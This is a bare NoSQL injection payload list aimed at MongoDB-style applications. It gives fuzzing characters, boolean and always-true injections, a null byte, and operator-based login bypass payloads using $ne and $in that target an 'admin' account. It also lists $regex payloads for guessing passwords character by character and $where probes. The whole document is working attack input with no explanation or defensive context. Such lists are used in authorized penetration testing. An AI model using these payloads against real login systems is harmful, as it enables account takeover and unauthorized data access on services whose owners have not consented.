# NoSQL Payload Collection

## Syntax Testing

'

"

`

{

}

---

## MongoDB Fuzz String

'"`{
;$Foo}
$Foo \xYZ

---

## Boolean

' && 0 && 'x

' && 1 && 'x

---

## Always True

'||'1'=='1

---

## Null Byte

%00

---

## Authentication Bypass

{
 "username":{"$ne":"invalid"},
 "password":{"$ne":"invalid"}
}

---

## Admin Targeting

{
 "username":{"$in":["admin"]},
 "password":{"$ne":""}
}

---

## Regex

{
 "password":{"$regex":"^a.*"}
}

{
 "password":{"$regex":"^admin.*"}
}

---

## Where

{
 "$where":"1"
}

{
 "$where":"0"
}